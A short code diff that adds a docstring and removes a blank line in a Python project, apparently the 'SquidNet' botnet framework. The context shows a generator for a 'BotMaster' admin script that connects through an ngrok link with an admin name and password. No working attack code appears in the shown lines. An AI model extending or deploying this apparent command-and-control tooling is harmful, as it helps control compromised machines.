@@ -3,6 +3,8 @@ from cryptography.fernet import Fernet
 from optparse import OptionParser
 
 class ArguementParse:
+    """Main Class for parsing command prompt arguements
+    when running the scripts."""
     def __init__(self):
         """If there are less than 2 arguements the option-parsing
         message will be displayed. Otherwise it will try to
@@ -908,7 +910,6 @@ SquidNet Admin Script By DrSquid''')
                         pass
 admin = BotMaster('""" + self.ngroklink + """',""" + str(
             self.ngrokport) + """,'""" + self.admin_name + """','""" + self.passw + """')      
-
         """
         return script
     def bot_script(self):
